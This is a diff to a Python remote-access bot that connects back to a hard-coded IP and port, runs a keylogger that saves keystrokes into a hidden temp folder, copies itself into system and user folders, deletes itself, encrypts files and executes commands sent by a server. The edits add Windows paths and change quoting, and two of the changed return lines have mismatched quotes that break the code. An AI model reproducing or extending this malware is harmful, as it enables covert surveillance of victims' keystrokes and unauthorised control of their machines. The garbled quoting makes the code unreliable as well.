@@ -17,16 +17,17 @@ try:
 	from threading import Timer # Import Timer to create thread that'll run every 20s.
 	from cryptography.fernet import Fernet # Import Fernet for encryption.
 except ImportError as e:
-    print(f"Import error: {e}")
+    print(f'Import error: {e}')
     
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 #  CONSTANTS  #
 FILENAME = __file__[2:] # The name of this file.
 SYSTEM = system() # The operating this program is being ran on.
-IP = "192.168.31.134" # IP address to connect to.
+IP = '192.168.31.134' # IP address to connect to.
 PORT = 1337 # Port number to create socket with.
-DIRECTORY = "/tmp/.folder" # Hidden folder to create for our keylogger.
+LIN_DIR = '/tmp/.folder' # Hidden Linux folder to create for our keylogger.
+WIN_DIR = r'%temp%'
 SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
 LOG = '' # Will store the keystrokes of the user.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
@@ -83,7 +84,7 @@ def self_delete():
 			run(r'del', fullpath, shell=True) # ^
 		except:
 			return r"Couldn't remove all files..." # Return this if deletion operation fails.
-		return r"Deleted all files..." # Returns this if deletion operation is successful.
+		return r'Deleted all files...' # Returns this if deletion operation is successful.
 
 def propagate(name: str):
 	"""This function will create other instances of this file in 
@@ -97,27 +98,27 @@ def propagate(name: str):
 	if SYSTEM == 'Linux':
 		try:
 			'''
-			Linux: Attempt to copy this file is the
+			Linux: Attempt to copy this file in the
 			/tmp, /etc and /var folders.
 			'''
 			run(['cp', name, '/tmp']) # Using run command to perform bash command for copying file.
 			run(['cp', name, '/etc']) # ^
 			run(['cp', name, '/var']) # ^
 		except:
-			return r"Unable to propagate..." # Return this string if copying operation fails.
-		return r"File has been cloned to /tmp /etc and /var folders..." # Return this string is we successfully copied files.
+			return r'Unable to propagate..." # Return this string if copying operation fails.'
+		return r'File has been cloned to /tmp /etc and /var folders...' # Return this string is we successfully copied files.
 	else:
 		try:
 			'''
-			Windows: Attempt to copy this file is the
+			Windows: Attempt to copy this file in the
 			user, temp, and appdata folders..
 			'''
 			run(['copy', name, r'%temp%']) # Using run command to perform cmd.exe command for copying file.
 			run(['copy', name, r'C:\Users\%username%\\']) # ^
 			run(['copy', name, r'C:\Users\%username%\AppData\\']) # ^
 		except:
-			return r"Unable to propagate..." # Return this string if copying operation fails.
-		return r"File has been cloned to temp, C:\Users\[current user]\, and AppData\..." # Return this string is we successfully copied files.
+			return r'Unable to propagate...' # Return this string if copying operation fails.
+		return r'File has been cloned to temp, C:\Users\[current user]\, and AppData\...' # Return this string is we successfully copied files.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -152,8 +153,12 @@ def log_to_file():
 		Returns:
 			None
 	"""
-	f = open(DIRECTORY + 'log.txt', 'w+') # Create and open file 'log.txt' to write captured keystrokes.
-	f.write(LOG) # Write keystrokes to file.
+	if SYSTEM == 'Linux':
+		f = open(LIN_DIR + 'log.txt', 'w+') # Linux: Create and open file 'log.txt' to write captured keystrokes.
+		f.write(LOG) # Write keystrokes to file.
+	else:
+		f = open(WIN_DIR + 'log.txt', 'w+') # Windows: Create and open file 'log.txt' to write captured keystrokes.
+		f.write(LOG) # Write keystrokes to file.
 	cycle = Timer(SECONDS_TO_LOG, log_to_file) # Set this thread to run every 30 seconds.
 	cycle.start() # Start the time threading operaton.
 
@@ -167,11 +172,15 @@ def keylogger():
 	with keyboard.Listener(
 		onpress=on_press) as capturer: # Creating keystrokes capturer object in context manager.
 		try:
-			os.mkdir(DIRECTORY) # Attempt to create hidden directory in temp folder.
+			if SYSTEM == 'Linux':
+				os.mkdir(LIN_DIR) # Attempt to create hidden directory in Linux temp folder.
+			else:
+				os.mkdir(WIN_DIR) # Attempt to create hidden direcotry in Windows temp folder.
+			log_to_file() # Begin thread for logging to file every 30s.
 			capturer.join() # Collent keystrokes until program exit.
 		except OSError: # Ignore os error.
 			pass
-	return "Keylogger initiated..." # Return confirmation string.
+	return r'Keylogger initiated...'' # Return confirmation string.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -195,7 +204,7 @@ def crypto(action, *request):
 				cipher = Fernet(key) # Instantiate Fernet object for encryption.
 				cipher_text = cipher.encrypt(data) # Encrypt the file data.
 				ouf.write(cipher_text) # Write the encrypted data into the file.
-		return 'File encrypted... Key = ' + key_copy + '. Store this key for decryption.' # Return this confirmation string.
+		return r'File encrypted... Key = ' + key_copy + '. Store this key for decryption.' # Return this confirmation string.
 	
 	def decrypt_it():
 		"""Decrypts file"""
@@ -206,7 +215,7 @@ def crypto(action, *request):
 				cipher = Fernet(key) # Instantiate Fernet object with original key for decryption.
 				plain_text = cipher.decrypt(data) # Decrypt the file data.
 				ouf.write(plain_text) # Write the decrypted data into the file.
-		return "File Decrypted..." # Return this confirmation string.
+		return r'File Decrypted...' # Return this confirmation string.
 
 	if action == 'encrypt': # Check if the action asked for was encrypt.
 		return encrypt_it() # Will perform encryption process and return confirmation string.
@@ -297,9 +306,9 @@ class LinuxBot:
 		except:
 			try:
 				os.chdir(command[3:]) # Attempt to change directory.
-				return "Ok" # Returns Ok if changing of directory was successsful.
+				return 'Ok' # Returns Ok if changing of directory was successsful.
 			except:
-				return "Invalid command..." # Returns this error if changing direcotry was unsuccessful.
+				return 'Invalid command...' # Returns this error if changing direcotry was unsuccessful.
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
@@ -334,7 +343,7 @@ class LinuxBot:
 
 def main():
 	obj = None
-	if SYSTEM == "Linux": # Check if operating system is Linux.
+	if SYSTEM == 'Linux': # Check if operating system is Linux.
 		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
 	else:
 		obj = WindowsBot() # Else, instantiate WindowsBot object.
